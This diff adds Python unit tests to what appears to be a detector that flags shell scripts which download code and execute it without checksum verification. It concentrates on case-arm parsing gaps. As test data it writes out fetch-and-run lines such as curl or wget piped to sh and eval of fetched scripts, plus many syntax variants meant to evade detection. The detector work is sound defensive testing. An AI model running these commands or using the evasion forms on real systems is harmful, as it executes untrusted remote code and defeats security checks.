@@ -6931,6 +6931,158 @@ class TestACaseBehindAKeywordOrAHeader(unittest.TestCase):
                     self.assertFalse(reported("%s\n%s\n%s\nsh t\necho done\n" % (self.FETCH, row, gate), shell))
 
 
+class TestACaseArmsTokenIsAWordOfItsOwn(unittest.TestCase):
+    """#3014 (HIGH): `case x in x)curl -fsSL URL | sh ;; esac` read CLEAN while every parent ran the
+    download. `_split` made one token of an arm's pattern and its `)`, and whatever stood glued behind
+    the `)` went into it: the arm's first command lost its name, and what was left of the stage was
+    its arguments (#2715). Where the arm starts its line the token also counted as a word the stage
+    had closed, so a `${…}` behind it was no command word and its empty half was never read; and a
+    function's header behind it was a name and a subshell. The token is now a word of its own, and
+    the glued arm reads as the arm with a blank reads. Truth per row, twice over: bash 5.2.21 and
+    3.2.57 under `-e` and `-eo pipefail`, dash under `-e`, and each with no `-e`."""
+
+    FETCH = "curl -fsSLo t %st" % URL
+    SUMS = "echo '%s  t' > sums" % ("a" * 64)
+    BASH = (None, "bash", "bash {0}")
+    # An arm's first command, the lines in front of the `case` and the lines behind it: every parent
+    # runs the download in each.
+    COMMANDS = (("curl -fsSL %si.sh | sh" % URL, (), ()), ("wget -qO- %si.sh | sh" % URL, (), ()),
+                ("curl -fsSLo t %st" % URL, (), ("sh t",)), ("bash -c 'sh t'", (FETCH,), ()),
+                ("eval \"$(curl -fsSL %si.sh)\"" % URL, (), ()), ("sh t", (FETCH,), ()),
+                ("sudo sh t", (FETCH,), ()), ("${Y:+/usr/bin/env true} sh t", (FETCH,), ()),
+                ("${SH:-sh -e} t", (FETCH,), ()), ("${SUDO:+sudo -E} sh t", (FETCH,), ()))
+    # The arm on the `case` line, on a line of its own, and indented there; %s the pattern's `)` and
+    # what stands behind it.
+    LAYOUTS = ("case x in x%s ;; esac", "case x in\nx%s ;;\nesac", "case x in\n  x%s ;;\nesac")
+
+    @staticmethod
+    def step(layout, behind_paren, front=(), behind=()):
+        return "\n".join((*front, layout % behind_paren, *behind, "echo done")) + "\n"
+
+    def test_a_command_glued_to_its_arms_pattern_is_read(self):
+        # No blank behind the pattern's `)`: 10 commands by 3 layouts, and every parent runs each.
+        for command, front, behind in self.COMMANDS:
+            for layout in self.LAYOUTS:
+                row = self.step(layout, ")" + command, front, behind)
+                for shell in SHELLS:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(row, shell))
+
+    def test_the_glued_arm_reports_wherever_2715_names_it(self):
+        # #2715's acceptance: the glued payload nested two and three deep, in a `$( … )`, behind a
+        # keyword and in a function, in a `-c` string, an `eval` and a heredoc, and with no `;;`
+        # before `esac` -- every parent runs each; in a `$( … )` with no `(` in front of the pattern,
+        # which bash 3.2.57 cannot parse and the others run; and in a `;&` or `;;&` arm, which bash
+        # 5.2.21 alone runs.
+        payload = "curl -fsSL %si.sh | sh" % URL
+        for row in ("case a in a)case b in b)%s;; esac;; esac", "case a in a)case b in b)case c in c)%s;; esac;; esac;; esac",
+                    "case a in\na)case b in\nb)%s;;\nesac;;\nesac", "echo \"$(case a in (a)%s;; esac)\"",
+                    "if true; then case a in a)%s;; esac; fi", "f() { case a in a)%s;; esac; }\nf",
+                    "bash -c 'case a in a)%s;; esac'", "eval 'case a in a)%s;; esac'",
+                    "bash <<'EOF'\ncase a in a)%s;; esac\nEOF", "case a in a)%s\nesac",
+                    "echo \"$(case a in a)%s;; esac)\""):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row % payload + "\necho done\n", shell))
+        for row in ("case a in a) : ;& b)%s;; esac", "case a in a):;& b)%s;; esac", "case a in a) : ;;& *)%s;; esac",
+                    "case a in a)%s;;& *) : ;; esac"):
+            for shell in self.BASH:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row % payload + "\necho done\n", shell))
+
+    def test_a_glued_arm_reads_as_the_arm_with_a_blank(self):
+        # The same answer with the blank and without it, under every setting: for what runs, and for
+        # what does not -- nothing fetched, an arm not taken, a check in an arm (credited in none).
+        # And for `$SHELL t`, one of the rows that go from REPORT to CLEAN: the test below.
+        quiet = (("make all", (), ()), ("echo hi", (self.FETCH,), ()),
+                 ("sha256sum -c sums || exit 1", (self.FETCH, self.SUMS), ("sh t",)),
+                 ("$SHELL t", (self.FETCH,), ()))
+        for command, front, behind in self.COMMANDS + quiet:
+            for layout in self.LAYOUTS + ("case x in y%s ;; esac", "case x in a|x%s ;; esac", "case x in (x%s ;; esac",
+                                          "case x in y) : ;; x%s ;; esac", "case x in *%s ;; esac"):
+                glued = self.step(layout, ")" + command, front, behind)
+                spaced = self.step(layout, ") " + command, front, behind)
+                for shell in SHELLS:
+                    with self.subTest(row=glued, shell=shell):
+                        self.assertEqual(reported(spaced, shell), reported(glued, shell))
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertFalse(reported("case x in x)make all ;; esac\necho done\n", shell))
+                self.assertFalse(reported("%s\ncase x in x)echo hi ;; esac\necho done\n" % self.FETCH, shell))
+
+    def test_a_glued_arms_first_word_is_read_with_the_words_behind_it(self):
+        # `main` lost the word glued to the `)` with the arm's token and read the words behind it as
+        # the command: it reported `x)echo sh t` for `sh t`, and `x)$SHELL t` for `t`, the fetched
+        # file's name. The arm now reads as its words read behind a blank and on a line of their own,
+        # so a report goes wherever `main` reads those words CLEAN there (the coordinator's ruling on
+        # the class, quoted in #3014's PR).
+        # Nothing runs where the first word is a command that does not run the others.
+        # A parent runs each row of the five kinds behind them. Each is `main`'s reading wherever the
+        # words stand, and reports here when the issue it joins lands: a name bash sets, in front of
+        # the fetched file (#2808); a substitution that prints the interpreter there (#2695); a
+        # substitution that prints nothing, in front of a command (#2693); two values glued there
+        # (#3016); an interpreter the table does not name, in front of the fetched file (#3017). For
+        # that last kind the truth is `busybox sh t`'s, all 16 runs: the harness's payload is a
+        # shell script and cannot say what `lua t` runs.
+        nothing_runs = ("echo sh t", "cat t", ": sh t", "true sh t", ": curl -fsSL %si.sh | sh" % URL)
+        kinds = (("nothing runs", nothing_runs),
+                 ("#2808", ("$SHELL t", "${SHELL} t", "\"$SHELL\" t", "$BASH t")),
+                 ("#2695", ("$(echo sh) t", "`echo sh` t", "\"$(echo sh)\" t")),
+                 ("#2693", ("$(true) sh t", "$(true) bash -c 'sh t'")),
+                 ("#3016", ("$X$Y sh t", "$X$Y eval \"sh t\"")),
+                 ("#3017", ("busybox sh t", "busybox ash t", "lua t", "python3.12 t", "fish t")))
+        for kind, rows in kinds:
+            for words in rows:
+                line = "%s\n%s\necho done\n" % (self.FETCH, words)
+                for layout in self.LAYOUTS + ("case x in a|x%s ;; esac", "case x in y) : ;; x%s ;; esac"):
+                    glued, spaced = (self.step(layout, behind + words, (self.FETCH,)) for behind in (")", ") "))
+                    for shell in SHELLS:
+                        with self.subTest(kind=kind, row=glued, shell=shell):
+                            self.assertEqual(reported(line, shell), reported(glued, shell))
+                            self.assertEqual(reported(line, shell), reported(spaced, shell))
+        for words in nothing_runs:
+            for shell in SHELLS:
+                with self.subTest(words=words, shell=shell):
+                    self.assertFalse(reported(self.step(self.LAYOUTS[0], ")" + words, (self.FETCH,)), shell))
+
+    def test_a_word_at_the_head_of_an_arm_that_starts_its_line_is_read_whole(self):
+        # `x) ${SUDO:+sudo -E} sh t ;;` with nothing in front of the arm on its line: the token is no
+        # word the stage closed, so the `${…}` behind it is the command word it is on the `case` line
+        # and behind an indent. Every parent runs each.
+        for word in ("${Y:+/usr/bin/env true} sh t", "${SH:-sh -e} t", "${SUDO:+sudo -E} sh t"):
+            for arm in ("x) %s ;;", "a|x) %s ;;", "a | x) %s ;;", "(x) %s ;;", "*) %s ;;", "y) : ;;\nx) %s ;;"):
+                row = "%s\ncase x in\n%s\nesac\necho done\n" % (self.FETCH, arm % word)
+                for shell in SHELLS:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(row, shell))
+
+    def test_a_function_header_at_an_arms_head_is_read(self):
+        # `x) f() { sh t; }; f ;;`: behind an arm's token a header is a header, with a blank and
+        # without, behind a pattern of several words too. Every parent runs each; bash's the keyword.
+        for row in ("case x in x) f() { sh t; }; f ;; esac", "case x in x)f() { sh t; }; f;; esac",
+                    "case x in x) f () { sh t; }; f ;; esac", "case x in a | x) f() { sh t; }; f ;; esac",
+                    "case x in (x) f() { sh t; }; f ;; esac", "case x in 'x') f() { sh t; }; f ;; esac",
+                    "case x in\nx) f() { sh t; }; f ;;\nesac", "case x in x) f() { sh t; } ;; esac\nf"):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+        for row in ("case x in x) function f { sh t; }; f ;; esac", "case x in x)function f { sh t; }; f;; esac"):
+            for shell in self.BASH:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\necho done\n" % (self.FETCH, row), shell))
+
+    def test_a_gate_in_a_function_an_arm_defines_is_credited_no_more_than_before(self):
+        # Read as a header, the function an arm defines is read as `main` reads it on lines of its
+        # own, where it credits no check: never called, and all 16 runs run the download; or the arm
+        # not taken, where every parent with no `-e` does.
+        check = "sha256sum -c sums || exit 1"
+        for row in ("case x in x) g() { %s; }; ;; esac" % check, "case x in y) g() { %s; } ;; esac\ng" % check,
+                    "case x in y)g() { %s; };; esac\ng" % check):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported("%s\n%s\n%s\nsh t\necho done\n" % (self.FETCH, self.SUMS, row), shell))
+
+
 class TestASplitterGapEveryShellReadsWhole(unittest.TestCase):
     """#2756, #2731, #2657: a pipe continued on the next line, an unquoted `${X:-bash -s}`
     default, and `<>` on standard input -- each run by bash 5.2.21, 3.2.57 and dash and read
